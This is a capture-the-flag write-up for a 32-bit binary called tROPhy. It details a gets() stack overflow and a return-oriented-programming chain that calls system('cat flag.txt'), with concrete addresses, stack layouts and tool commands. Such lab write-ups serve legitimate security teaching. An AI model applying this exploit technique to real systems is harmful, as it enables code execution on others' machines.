# tROPhy 

The given program simulates a trophy management system in which the user can display their trophies, update their name or otherwise exit.

First let's do some diagnostics:
```bash
checksec vuln
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No

file vuln
vuln: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=52fd12d89652e9303a6f47ebc87ba82fa533f1a5, for GNU/Linux 3.2.0, not stripped
```

The binary is 32‑bit, has no stack canary, and has NX enabled. Since NX prevents shellcode execution, we must use a [ROP](https://ctf101.org/binary-exploitation/return-oriented-programming/) attack. Because there is no PIE + ASLR, all addresses inside the binary remain fixed, which makes exploitation much simpler. Since this is a 32‑bit binary, arguments are passed on the stack using the cdecl [calling convention.](https://ctf101.org/binary-exploitation/what-are-calling-conventions/)

Looking at the code there is a vulnerability in the `update_name()` function:
```c
void update_name() {
    char buf[32];
    puts("New name (up to 32 chars):");
    gets(buf);
    ...
```
`gets()` performs no bounds checking so we can overflow the buffer up to a nul terminator.

With this overflow, our goal is to execute `system("cat flag.txt")`. Notably, the program has a global variable `const char* config_filepath = "config.txt";`, which means there is a writable global memory region on the `.bss` section that we can safely use to store our own data.

Thus the exploit logic is as follows:
1. Exploit the vulnerable function to overwrite the stack and transfer control to `gets`
1. We then use `gets()` to write the string `"cat flag.txt"` into the `.bss` section,
3. Finally we jump execution to `system(bss)` to leak the flag.

---

To set up the exploit, we must construct the stack so that our functions chain together as expected. We want control to flow from the vulnerable function into `gets`, have `gets` write our command into `.bss`, and then return into `system` with that same `.bss` address as its argument.

Because the binary uses a 32‑bit calling convention, each function expects the stack to look like the following when it begins execution: 

```
[ return address ]
[ arg1 ]
[ arg2 ]
...
```


### Step 1: Overwrite the return address

The overflow allows us to overwrite the return address of the vulnerable function. Instead of returning normally, we replace it with the address of `gets@plt`:

```
[ gets_plt ]   <- return address
```

So when the function returns, execution jumps directly to `gets`.

### Step 2: Set up the argument for `gets`

For `gets` to receive `bss` as its argument, we must place the stack in the form that `gets` expects. That means we must place a return address for `gets`, followed by its argument.

We arrange the stack like this:

```
[ pop_ret ]    <- return address for gets
[ bss ]        <- argument 
```

So `gets(bss)` is executed, and our input string `"cat flag.txt"` is written into the `.bss` section.

### Step 3: Prepare the stack for `system`

After `gets` finishes, it executes a `ret` instruction. This causes execution to jump to the `pop_ret` gadget. At this point, the stack still contains the value `bss` at the top, which was the argument to `gets`. However, `system` expects the stack to look like this:

```
[ return address ]
[ argument pointer ]
```

So we must remove the leftover `bss` value from the stack before calling `system`. The `pop_ret` gadget does exactly this:

```
pop register
ret
```

This removes one value from the stack and then returns to the next address.

### Step 4: Stack before `system`

After `pop_ret` executes, we then need the stack to be arranged as follows:

```
[ system_plt ]   <- next return target
[ system_ret ]   <- return address for system
[ bss ]          <- argument to system
```

Execution now jumps into `system` and since `.bss` now contains the string `"cat flag.txt"`, the command is executed and the flag is printed.

Thus the final stack layout is as follows:
```
[ gets_plt ]
[ pop_ret ]
[ bss ]
[ system_plt ]
[ 0xdeadbeef ]
[ bss ]
```

---

## Getting our addresses

The binary has no PIE + ASLR, so all required addresses are static and can be extracted directly from the binary. This is shown as follows:

```bash
objdump -d ./vuln | grep gets
08048250 <gets@plt>:

objdump -d ./vuln | grep system
080482a0 <system@plt>:

ROPgadget --binary ./vuln | grep "pop"
0x080481f6 : pop ebx ; ret

readelf -S ./vuln | grep bss
0804b044
```

Or alternatively using `python-pwntools`
```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./vuln")
print(f"gets: {hex(exe.plt['gets'])}")   
print(f"system {hex(exe.plt['system'])}")
print(f"bss {hex(exe.bss())}")
```


This gives the final addresses:

```
gets     = 0x08048250
system   = 0x080482a0
bss      = 0x0804b044
pop_ret  = 0x080481f6
```

Thus using `solve.py` we get the flag:
```bash
./solve.py REMOTE
disorientation{st0p_ROP_4nd_r011!}
```
